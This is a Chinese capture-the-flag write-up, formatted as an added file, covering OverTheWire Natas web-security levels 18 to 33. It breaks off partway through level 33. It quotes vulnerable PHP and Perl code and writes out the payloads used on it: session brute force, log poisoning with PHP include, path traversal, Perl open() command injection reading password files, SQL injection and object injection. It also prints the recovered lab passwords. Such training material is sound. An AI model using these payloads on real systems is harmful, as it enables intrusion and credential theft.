@@ -1,0 +1,762 @@
+---
+title: "Web安全入门靶场Natas通关详解(下)"
+date: "2022-06-08"
+tags: ['Web']
+draft: false
+summary: "本文是对OverTheWire: Natas服务器端Web安全入门靶场通关的记录中的下半篇，主要包括第18-34关。"
+---
+
+简介：
+
+本文是对OverTheWire: Natas服务器端Web安全入门靶场通关的记录中的下半篇，主要包括第18-34关。
+
+
+
+### Level 18: PHP Session
+
+第18关帮助我们PHP Session变量的基础逻辑。PHP session 变量用于存储关于用户会话（session）的信息，包含了用户的属性和状态。它的工作机制是为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储对应的Session变量。UID 存储在 cookie 中，或者通过 URL 进行传导。
+
+首先与PHP Session有关的关键代码如下所示：
+
+```PHP
+if(my_session_start()) {  #首先判断用户是否已经登陆(建立了会话)
+    print_credentials();
+    $showform = false;
+} else { 				# 用户首次访问页面
+    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
+    session_id(createID($_REQUEST["username"]));   # 为用户生成唯一的session id
+    session_start(); 							# 开启会话
+    $_SESSION["admin"] = isValidAdminLogin(); 	  # 为seesion变量赋值
+    debug("New session started");
+    $showform = false;
+    print_credentials(); # 判断$_SESSION["admin"]==1来决定是否打印下一关的密码
+    }
+}
+```
+
+此题所给出的源代码中，`isValidAdminLogin()`的返回值一直是零，也就是新开启的session均无法使得
+
+`$_SESSION["admin"]`的值为1。而且，源代码中提示session id的分配最多为640，因此我们可以尝试冒充其他通过admin登陆的用户，爆破其session id进行访问。
+
+![](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8B/18.png)
+
+果然`session id=119`的用户是通过admin登陆的，我们可以直接获得下一关的密码。
+
+```
+natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+```
+
+### Level 19: PHP Session进阶
+
+第19关给出了提示：源代码与18关几乎相同，只是session id的生成不再是简单的数字。因此我们首先需要猜测session id是如何生成的，才能继续爆破。
+
+```
+333230 2d61 646d 696e admin:xxx
+353533 2d61 646d 696e admin:xxx
+353437 2d61 646d 696e admin:xx
+313639 2d			 
+353831 2d61 646d 696e admin:
+```
+
+所以我们可以看出`0x61 0x64 0x6d 0x69 0x6e`是`admin`的ascii编码的16进制形式。而`0x2d`以同样的方式对应着字符`-`，所以我们有理由猜测用户session id的生成是通过`随机的三位数字-用户名`再进行ascii编码以16进制形式表示。由于我们的目标用户就是admin，因此我们的爆破格式如下图所示，三个爆破位均为30-39的数字，代表着0-9的ascii编码的16进制形式。
+
+![19-1](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8B/19-1.png)
+
+最终爆破得到admin用户的session id为`3238312d61646d696e`.
+
+![19-2](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8B/19-2.png)
+
+```
+natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+```
+
+### Level 20: PHP Session 反序列化
+
+在20关中PHP Session的基础上，用户的session信息在服务器端是通过文件的方式进行存储的，而文件名即由用户的uid构成。当用户初次请求时，则为用户生成session变量并在将其存储至文件中。当用户再次请求时则需要从该文件中读取得到用户的session变量。其中由变量到文件的过程即需要序列化和反序列化的操作，具体说明如下：
+
+关于PHP序列化serialize()函数有三点需要强调：
+
+> The serialize() function converts a storable representation of a value. 
+>
+> To serialize data means to convert a value to a sequence of bits, so that it can be stored in a file, a memory buffer, or transmitted across a network. 
+>
+> Return: A string that contains a byte-stream representation of *value*.
+
++ 功能：serialize()函数将PHP中的值转换为可以存储的表示；
++ 目的：将数据序列化意味着将其转换为字节流，以便其可以被文件、内存缓存存储或者在网络中被传递；
++ 返回值：serizlize()函数的返回值为保存着输入值字节流表示的**字符串**；
+
+反序列可以理解为PHP序列化的逆操作，将文件、内存缓存或者网络中的字节流字符串还原为PHP中的对象/值。本题中`myread()`函数和`mywrite()`函数即自己实现的反序列化和序列化函数。
+
+```PHP
+function myread($sid) { 
+    debug("MYREAD $sid"); 
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID"); 
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode();
+}
+
+function mywrite($sid, $data) { 
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data"); 
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID"); 
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+}
+```
+
+根据上述代码我们发现在从文件中读取序列化的字符串时，使用换行符`\n`用来分隔每个键值对，并使用空格来分隔键和值。因此我们很自然的想到在username中注入`jackfromeast\nadmin 1`来使得反序列化后在session变量中得到$_SESSION['admin']=1.
+
+因此我们需要在请求包的POST请求中构造：`username=jackfromeast%0Aadmin 1`
+
+**字符编码问题**
+
+在实验中我尝试直接在input框中输入`jackfromeast\nadmin 1`来进行注入，这无法注入通过。通过debug参数我可以得到以下内容：
+
+```
+DEBUG: MYWRITE j793lcslite07r5onjrdl15dn1 name|s:21:"jackfromeast\nadmin 1";
+DEBUG: Saving in /var/lib/php5/sessions//mysess_j793lcslite07r5onjrdl15dn1
+DEBUG: name => jackfromeast\nadmin 1
+
+DEBUG: MYREAD j793lcslite07r5onjrdl15dn1
+DEBUG: Reading from /var/lib/php5/sessions//mysess_j793lcslite07r5onjrdl15dn1
+DEBUG: Read [name jackfromeast\nadmin 1]
+DEBUG: Read []
+DEBUG: Name set to jackfromeast\nadmin 1
+```
+
+用户所提交的字符串`jackfromeast\nadmin 1`被浏览器进行URL编码后为`jackfromeast%5Cnadmin+1`发送到服务器端。其中`\n`被当作了反斜杠和n，二进制形式(ascii编码)的话就是分开的`0x2F 0x6E`，而我们目标的换行符在URL编码后对应的`%0A`,二进制形式(ascii编码)也为`0x0A`，两者是需要区分的。前者由于后续代码也没有转义操作，所以并不会当作换行符。
+
+在mywrite()函数的第15行，分隔符为`"\n"`也就是被转义的`\n`即换行符，对应的二进制表示为0x0A。因此显然反斜杠和n是无法被匹配到的。
+
+**字符编码一直是一个比较容易困惑的问题，字符串本身具有二义性，我们需要根据其编码方式来得到该字符串是如何被理解的(是否被转义)。以上就是一个很好的例子**
+
+```
+natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ
+```
+
+### Level 21: PHP Session
+
+第21关仍与PHP的Session变量有关然而非常简单。我们可以关注到以下代码，其不经过筛选就将POST的参数均输入至session变量中，因此我们可以再POST参数中注入`admin=1`.
+
+```PHP
+// if update was submitted, store it
+if(array_key_exists("submit", $_REQUEST)) {
+    foreach($_REQUEST as $key => $val) {
+    $_SESSION[$key] = $val;
+    }
+}
+```
+
+此外，由于该页面与主页面共享`session id`，所以我们使用相同的`session id`去请求主页面即可得到下一面的密码。
+
+```
+natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+```
+
+### Level 22: PHP header函数
+
+第22关中的代码如下所示。可见当请求中带有值为revelio的GET参数既可以打印下一关的密码，但是运行后发现该代码的前部存在`header("Location: /")`使我们不断请求根目录，而无法看见主页面的返回。
+
+header()函数用于发送原生的http头部，有两种常见的使用情况：1. 用于发送HTTP状态码，`header("HTTP/1.1 404 Not Found");`；2. 与Location搭配使用进行重定向，`header("Location: http://www.example.com/");`。需要注意的是，第2种情况下它会把请求报文返回给浏览器，并返回重定向码。
+
+```PHP
+<?
+session_start();
+
+if(array_key_exists("revelio", $_GET)) {
+    // only admins can reveal the password
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
+    header("Location: /");
+    }
+}
+?>
+    
+<?
+    if(array_key_exists("revelio", $_GET)) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas23\n";
+    print "Password: <censored></pre>";
+    }
+?>
+```
+
+此题中为情况2，但是其实在重定向之前我们还是可以接受到原请求的响应报文，通过burp suite在HTTP History中可以看到。
+
+![](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8B/22.png)
+
+```
+natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+```
+
+### Level 23: 字符串与数字比较
+
+第23关的源代码如下所示，展示了一个非常有趣的想象，即字符串与数字比较。
+
+```PHP
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas24 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+?> 
+```
+
+PHP中的比较运算有如下规则：
+
+1. 当字符与字符比较时，实际上是比较两字符对应ascii码的大小；
+2. 当字符串与字符串比较时，逐个比较每个字符的对应ascii码，当遇到第一个存在较大的字符时直接判断结果；
+3. 当字符串与数字进行比较时，会首先将字符串转换为整型/符点型，然后在进行比较；
+
+因此根据规则三，我们只需要令`password="11iloveyou"`，在比较时该字符串会被转换为11，从而进入打印下一关密码的代码段。
+
+```
+natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg
+```
+
+### Level 24: strcmp函数绕过
+
+第24关中展示了php 5.2版本之前strcmp函数的一个漏洞。
+
+```PHP
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(!strcmp($_REQUEST["passwd"],"<censored>")){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas25 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+?> 
+```
+
+PHP中的`strcmp($str1, $str2)`函数用于比较两个字符串是否相等。如果两个字符串相等则返回0，若`$str1>$str2`则返回`>0`，反之则返回`<0`。该函数的漏洞存在于如果strcmp函数接受到不为字符串类型的变量，则会报错并返回0。因此我们可以构造passwd为数组绕过。
+
+```URL
+http://natas24.natas.labs.overthewire.org/?passwd[]=0
+```
+
+```
+natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c
+```
+
+### Level 25: include代码注入
+
+第25关中的关键代码如下所示，我们可控的`$filename`需要绕过`safeinclude`函数中`strstr`函数和`str_replace`函数的过滤和审查。
+
+```PHP
+function safeinclude($filename){
+    // check for directory traversal
+    if(strstr($filename,"../")){
+        logRequest("Directory traversal attempt! fixing request.");
+        $filename=str_replace("../","",$filename);
+    }
+    // dont let ppl steal our passwords
+    if(strstr($filename,"natas_webpass")){
+        logRequest("Illegal file access detected! Aborting!");
+        exit(-1);
+    }
+    // add more checks...
+
+    if (file_exists($filename)) { 
+        include($filename);
+        return 1;
+    }
+    return 0;
+}
+```
+
+首先对于`str_replace`函数，我们其使用正则匹配的方式在输入中匹配目标字符串并替换为空，因此我们可以采用**重写**的方式来绕过，如`<scr<script>ipt>`被替换后将得到我们想要的`<script>`。
+
+```
+....//....//....//....//....//....//etc/Natas_webpass/natas26
+```
+
+接着，对于`strstr`函数，该函数是大小写敏感的，因此我们可以通过大小写的方式绕过。
+
+对于`file_exists`函数是大小写不敏感的，也就是说当我们目标是`natas26`文件时，输入`NATAS26`该函数返回值同样是1。但是php中的include函数是否大小写敏感与系统文件系统有关。在我实验后发现对于OS X，是大小写不敏感的，但是对于Linux则是大小写敏感的。也就是说，在OS X中我们可以通过大写的文件名来打开该文件，但是在Linux下则是不可以的。
+
+很遗憾的是，natas网站是搭建在linux服务器上的，因此通过`...//....//....//....//....//etc/NATAS_webpass/natas26`无法获取该文件。
+
+继续审计源代码发现`logRequest`函数中`$_SERVER['HTTP_USER_AGENT']`是可控的并且会写入到指定的log文件。接着通过以上`safeInclude`函数我们即可获取该文件内容。**此外，`include`函数有一重要特性就是会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中，也就是说当被包含文件中含有php代码时会被直接执行。**利用这一特点我们可以将`$_SERVER['HTTP_USER_AGENT']`构造为获取下一关passwd的php代码。
+
+```PHP
+function logRequest($message){
+    $log="[". date("d.m.Y H::i:s",time()) ."]";
+    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+    $log=$log . " \"" . $message ."\"\n"; 
+    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+    fwrite($fd,$log);
+    fclose($fd);
+}
+```
+
+因此，`$_SERVER['HTTP_USER_AGENT']`可以被我们构造为如下语句：
+
+```
+<? include "/etc/natas_webpass/natas26" ?>
+```
+
+![](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8B/25.png)
+
+```
+natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+```
+
+### Level 26: PHP 反序列化漏洞之对象注入
+
+第26关向我们展示了PHP反序列化漏洞之一的对象注入漏洞，相关基本知识可以参考[此帖子](https://www.secpulse.com/archives/4809.html)。当然在此我也会进行简要的讲解。
+
+**魔法方法**
+
+首先PHP的类与对象的概念与其他面向对象的语言相似，这里不再赘述。但是PHP的类中一类特殊方法即，魔法方法(magic function)。魔幻方法的名字以双下划线`__`开头，这些方法**在某些特定的条件下会自动被调用**，包括`__construc`、`__destruct`、`__toString`、`__sleep`、`__wakeup`等等这些都是类的魔幻方法。
+
++ `__construc`: 在创建对象时候初始化对象调用，一般用于对变量赋初值；
++ `__destruct`：在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用；
++ `__toString`：当一个对象用作一个字符串时被自动调用;
++ `__wakeup`：在反序列化时被调用，预先准备对象需要的资源，例如重新建立数据库连接，或执行其它初始化操作；
++ `__sleep`：在序列化时被调用，用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。
+
+**对象注入漏洞**
+
+在完成序列化和反序列化时，我们已知特定条件下魔术方法会自动被调用。而当**一个序列化后的对象中包含有攻击者控制的对象值时，便可能存在PHP反序列化漏洞。当我们web应用的源代码中发现，一个类中定义了`__wakeup`或`__destruct`方法，并且这些方法进行了一些可能会影响web应用的操作时，对象注入漏洞便可能存在。
+
+回到题目中我们发现代码中定义了Logger类，如下所示。可见在`__destruct()`中，当对象被销毁(引用为空时)会存在打开文件并写入的操作。因此，如果我们可以控制这三个私有变量，将`$logFile`设置为php文件并写入代码，在访问时即可完成命令注入。
+
+```PHP
+class Logger{
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+
+    function __construct($file){
+        // initialise variables
+        $this->initMsg="#--session started--#\n";
+        $this->exitMsg="#--session end--#\n";
+        $this->logFile = "/tmp/natas26_" . $file . ".log";
+        // write initial message
+        $fd=fopen($this->logFile,"a+");
+        fwrite($fd,$initMsg);
+        fclose($fd);
+    }                       
+    function log($msg){
+        $fd=fopen($this->logFile,"a+");
+        fwrite($fd,$msg."\n");
+        fclose($fd);
+    }                       
+    function __destruct(){
+        // write exit message
+        $fd=fopen($this->logFile,"a+");
+        fwrite($fd,$this->exitMsg);
+        fclose($fd);
+    }                       
+}
+ 
+```
+
+在后续代码中，我们发现存在对`$cookie`中`drawing`变量的序列化和反序列化。如果我们可以偷天换日般的返回一个精心构造logger对象代替原有的drawing对象，则可以在其第18行重新引用后(此时原Logger对象被销毁，调用destruct函数)访问该log文件即可控制获取下一关的密码。
+
+```PHP
+function storeData(){
+    $new_object=array();
+    if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+       array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+        $new_object["x1"]=$_GET["x1"];
+        $new_object["y1"]=$_GET["y1"];
+        $new_object["x2"]=$_GET["x2"];
+        $new_object["y2"]=$_GET["y2"];
+    }
+
+    if (array_key_exists("drawing", $_COOKIE)){
+        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+    }
+    else{
+        // create new array
+        $drawing=array();
+    }
+    $drawing[]=$new_object;
+    setcookie("drawing",base64_encode(serialize($drawing)));
+}
+```
+
+如下图所示，将生成的base64编码值其替换原有的`cookie`中的`drawing`变量，再去访问`http://natas26.natas.labs.overthewire.org/img/natas27.php`即可得到下一关的密码。
+
+![](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8B/26.png)
+
+```
+natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+```
+
+### Level 27: MySQL 尾空格
+
+第27关是一道SQL注入类型的题目。具体的代码逻辑是：用户通过`username`和`password`登陆账号，首先后端再数据库中查询是否存在`username`，若不存在则创建用户；如果存在则继续判断`username`和`password`是否正确，若正确则通过查询打印该用户的所有信息，若不正确则返回`"Wrong Password"`。其中有关数据库查询的地方均会使用`mysql_real_escape_string()`函数进行对危险字符串进行转义。
+
+首先我尝试绕过`mysql_real_escape_string()`函数。该函数会在危险的字符，如`"`，`'`，`%00`等前面加上反斜杠进行转义。我一开始准备使用**宽字节**绕过，然而发现该数据库的编码方式并不是`gdk`，只能作罢。具体关于宽字节绕过的知识详见[此篇博客](https://www.freebuf.com/column/165567.html)。
+
+接着，我注意到打印用户信息的dumpData函数如下所示。竟然使用While循环完成用户信息的打印并且加上代码逻辑上会在用户名不存在时创建新的用户加入数据表中，这些提示我们可能需要注入一同名用户。
+
+```PHP
+function dumpData($link,$usr){
+    
+    $user=mysql_real_escape_string($usr);
+    
+    $query = "SELECT * from users where username='$user'";
+    $res = mysql_query($query, $link);
+    if($res) {
+        if(mysql_num_rows($res) > 0) {
+            while ($row = mysql_fetch_assoc($res)) {
+                // thanks to Gobo for reporting this bug!  
+                //return print_r($row);
+                return print_r($row,true);
+            }
+        }
+    }
+    return False;
+}
+```
+
+**mysql 对于尾空格的处理**
+
+在查询时，mysql对于char或者varchar字段的尾空格进行忽略。假如现有user表中存在`'user'`和`'user   '`两行，如果我们使用查询`SELECT * from user where username='user'`会将两行内容均返回。此现象的原因是 mysql中char、varchar 和 text 类型字段的排序和比较过程受排序规则影响，而当排序规则为`PAD SPACE`时会自动忽略尾部的空格。在存储时，不会自动截断尾部的空格，会按原值存储。
+
+因此利用此特性，我们可以注入一创建带有空格的`natas28`用户来解决此关。但是如何才能创建一同名但尾部带有空格的用户呢？因为在`validUser()`比较时，同样收到PAD SPACE的影响，注入的用户名`'natas28        '`会被认为已经存在于数据表中，导致无法创建新的用户。该问题可以通过mysql的溢出截断机制来解决。
+
+**mysql的字段溢出截断**
+
+在存储时，mysql对于超出规定大小的字符串会进行截断保存处理。因此，利用此性质我们可以构造一个超出此题目中64字符限制的字符串`'natas28                           1'`，这样在比较时并不会因为`PAD SPACE`而比较成功，而在保存到数据表时，末尾的1又会被截断，成为只存在若干尾部空格的`natas28`。
+
+因此，最终的请求如下所示。
+
+![](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8B/27.png)
+
+再次以`username=nata28`和`password=''`进行登录时即可得到下一关的密码，因为密码验证时会比较所有返回的结果。
+
+```
+natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF
+```
+
+### Level 28: Cryptography
+
+第28关涉及了比较复杂的密码学，因此暂时跳过吧。
+
+```
+natas29:airooCaiseiyee8he8xongien9euhe8b
+```
+
+### Level 29: Perl open函数
+
+此关中，当我们在下拉框中选择不同的选项比如`perl underground 4`，则该页面会生成如下请求`http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground+4`。也就是说该页面时`perl`语言书写的，并且会将`file`的内容写入当前网页中。并且此关并没有给出源码，因此我们需要进行尝试。
+
+**perl中的open函数**
+
+Perl语言中基本的文件打开函数为`open()`，与PHP语言中的`require()`或者`include()`函数类似。`open`函数在特定的情况下可以与`|`搭配完成命令执行，具体地引用其他文章中的说明：
+
+> The `open` command can be used for command execution. By prefixing the filename with a pipe (`|`), the rest of it is interpreted as a command invocation, which accepts standard input by printing to the filehandle, and is executed after the filehandle is closed. If the last character is a pipe, then the command is executed and its standard output is fed into the filehandle where it can be read using Perl's file input mechanisms.
+
+也就是说当重定向符号`|`在开头时，后面的部分将被看作从文件句柄中读取作为标准输入的命令调用，在文件句柄关闭后执行；当重定向符号在末位时，其之前的部分被当作命令调用，并将执行结果作为标准输出至文件句柄当中。两种方式的使用情景不同，具体实例可以参考[此帖子](https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html)。
+
+以上我们可以看到如果没有严格的审查，open函数将存在着命令注入漏洞。
+
+我们接着尝试注入ls命令，令`file=|ls`发现结果并没有返回。观察原参数请求，发现可能是因为输入的文件名被拼接了后缀。因此，我们尝试使用`%00`进行截断。该目录下的结果成功被返回了。我直接打印了`index.pl`的源码进行查看，关键代码如下所示。
+
+```perl
+if(param('file')){
+    $f=param('file');
+    if($f=~/natas/){
+        print "meeeeeep!";
+    }
+    else{
+        open(FD, "$f.txt");
+        print "";
+        while (<fd>){
+            print CGI::escapeHTML($_);
+        }
+        print "</fd>";
+    }
+}
+```
+
+**系统命令注入绕过姿势**
+
+从源码中可以看到，存在对文件名file中的natas进行匹配(perl语言中`=~`是匹配操作符)。所以，我们仍需绕过该匹配审查。绕过该字符串匹配的方式并完成命令注入的方式有很多，这里列举以下三种。首先，简单的方法是利用Linux命令下`""`和`''`的特殊作用，即表示需转义或者放弃任何特殊含义的字符串，在linux命令中可以随意添加而不影响命令本身执行。第二，我们可以尝试使用路径或文件名匹配时的通配符的`?`来匹配一个任意字符。第三，我们可以通过在linux命令执行中表示转义的反斜杠来绕过，如下所示。
+
+```
+|cat%20/etc/na""tas_webpass/na""tas30%00
+|cat%20/etc/na''tas_webpass/na''tas30%00
+|cat%20/etc/na?as_webpass/na?as30%00
+|cat%20/etc/na\tas_webpass/na\tas30%00
+```
+
+**闭合符 vs 引号绕过**
+
+这里记录一下犯傻瞬间。在观察上述代码第7行后，我借鉴之前SQL注入中闭合符的思想竟然尝试使用通过`“”`引s号闭合+拼接的方式绕过，也就是说令file为`|cat /etc/na"."tas_webpass/na"."tas30%00`。这显然是无法成功执行的，因为我在试图使用字符串中的双引号来闭合表示字符串的双引号。事实上，在我们GET参数`$file`整体被作为一个字符串变量，当需要打印或者传递时，通过双引号或者单引号来表示是否对其中的特殊字符进行转义。而SQL注入中会存在将外部变量拼接至`$query`字符串变量进行查询的情景，实际上也是对`$query`字符串变量内的引号进行闭合，如`SELECT * from users where username="zhangsan" or 1=1`中zhangsan前后的引号。
+
+```perl
+$f = '|cat /etc/na"."tas_webpass/na"."tas30%00';
+print("$f"); # |cat /etc/na"."tas_webpass/na"."tas30%00
+```
+
+```
+natas30:wie9iexae0Daihohv8vuu3cei9wahf0e
+```
+
+### Level 30: Perl函数 quote(param())
+
+本关是Perl函数版本的SQL注入，然而我们发现本关使用`$dbh->quote()`函数对我们输入的参数进行处理。`quote()`函数会将输入字符串（如果需要）周围加上额外的引号，并在输入字符串内转义特殊字符。这使得我们之前的注入命令仅会被完整的当作一个字符串处理。这将是我们的注入姿势无计可施。
+
+```Perl
+if ('POST' eq request_method && param('username') && param('password')){
+    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
+    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 
+
+    my $sth = $dbh->prepare($query);
+    $sth->execute();
+    my $ver = $sth->fetch();
+    if ($ver){
+        print "win!<br>";
+        print "here is your result:<br>";
+        print @$ver;
+    }
+    else{
+        print "fail :(";
+    }
+    $sth->finish();
+    $dbh->disconnect();
+}
+```
+
+问题的转机在于perl的`param()`函数与`quote()`函数搭配使用。在Perl中，可以使用`param('name')`方法获取post表单中`name`参数的值，但是这个方法有一个特点，那就是当我们输入`name=foo`时，`param('name')`方法返回的是name的值`foo`；当我们输入`name=foo&name=bar`时，`param('name')`方法返回的是`name`的值列表`["foo","bar"]`。
+
+而在`Perl`中，当`quote()`方法的传参类型为列表时，`quote()`会将其每个值解释为单独的参数。当`quote()`可以接收两个参数时，它的用法变为：第一个参数表示将要被quote的数据，第二个参数表示一个SQL数据类型，决定如何quote。如果第二个参数是非字符串类型（如NUMERIC），则quote将传递其第一个参数，而不带任何引号。这就构成了SQL注入的机会。
+
+因此，我们构造POST参数如下，即可成功绕过。
+
+```
+username=natas31&password='xxx' or 1=1 &password=1
+```
+
+```
+natas31:hay7aecuungiuKaezuathuk9biin0pu1
+```
+
+### Level 31: Perl 文件上传
+
+此关展示了使用perl语言实现的文件上传的逻辑。首先，调用`$cgi`变量的`upload`方法查看请求中是否存在文件上传，接着调用`param`函数获取该参数的值。最终使用`<>`运算符将上传的文件内容进行打印。
+
+```perl
+my $cgi = CGI->new;
+if ($cgi->upload('file')) {
+    my $file = $cgi->param('file');
+    print '<table class="sortable table table-hover table-striped">';
+    $i=0;
+    while (<$file>) {
+        my @elements=split /,/, $_;
+
+        if($i==0){ # header
+            print "<tr>";
+            foreach(@elements){
+                print "<th>".$cgi->escapeHTML($_)."</th>";   
+            }
+            print "</tr>";
+        }
+        else{ # table content
+            print "<tr>";
+            foreach(@elements){
+                print "<td>".$cgi->escapeHTML($_)."</td>";   
+            }
+            print "</tr>";
+        }
+        $i+=1;
+    }
+    print '</table>';
+}
+```
+
+**`$cgi->param`函数**
+
+该函数用于获取传入的POST或者GET参数。该函数的一特性是如果存在同名的参数则均会按顺序返回。但是我们看到第三行中，等号左侧仅有一个变量来接受，所以会返回第一个键为`file`的请求参数。这也可以理解为param函数可以被利用的同名参数漏洞。
+
+**`<>`运算符**
+
+perl语言中`<>`运算符可以理解为针对文件的`readline()`函数，但可以处理不同的输入，具体如下所示：
+
++ 若为文件句柄，尖括号运算符则对该文件句柄进行读取；
++ 若为搜索模式，尖括号运算符则返回与该模式匹配的文件列表；
++ 若参数为字符串"ARGV"，则表示从命令行中读取文件名并使用`open()`函数来打开；
+
+以上，我们可以利用这两者的特性，针对运算符`<>`，构造得到经过$cgi->param`函数获取得到的变量为字符串"AVGR"，再将open函数变为exec函数去执行系统命令(参考29关对open函数的讲解)。
+
+![](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8B/31.png)
+
+```
+natas32:no1vohsheCaiv3ieH4em1ahchisainge
+```
+
+### Level 32: Perl 文件上传提权
+
+第32关与第31关的源码相比并没有任何改动，只不过`/etc/natas_webpass/natas32`文件的读取权限升级为`root`，而我们的只是`natas32`用户。因此，我猜想本关是想展示在没有root权限下如何获取到用户名密码。
+
+根据首页的提示我们需要执行webroot路径下的一个二进制文件来获取密码。构造方法与上一关相同：
+
+![32-1](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8B/32-1.png)
+
+我们可以得到webroot目录下getpassword二进制文件的执行权限如下所示，也就是说对于natas32用户时可读可写可执行的。getpassword的内容即是打开`/etc/natas_webpass/natas32`并将其内容逐个打印。可见由此，我完成了一次提权操作，即查看了只用root用户才可以访问的文件。
+
+![32-2](/static/images/Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E9%9D%B6%E5%9C%BANatas%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3-%E4%B8%8B/32-2.png)
+
+````
+natas33:shoogeiGa2yee3de6Aex8uaXeech5eey
+````
+
+### Level 33: Phar反序列化漏洞
+
+第33关的源代码如下所示。该代码中定义了一个`Executer`对象，其中的`__construct`函数将用户上传的文件复制到指定目录，`__destruct`方法会首先完成一个md5校验，若成功则会使用php执行用户上传的文件。
+
+```PHP
+<?php
+    class Executor{
+    private $filename=""; 
+    private $signature='adeafbadbabec0dedabada55ba55d00d';
+    private $init=False;
+
+    function __construct(){
+        $this->filename=$_POST["filename"];
+        if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
+            echo "File is too big<br>";
+        }
+        else {
+            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
+                echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
+                echo "Firmware upgrad initialised.<br>";
+            }
+            else{
+                echo "There was an error uploading the file, please try again!<br>";
+            }
+        }
+    }
+
+    function __destruct(){
+        if(getcwd() === "/") chdir("/natas33/uploads/");
+        if(md5_file($this->filename) == $this->signature){
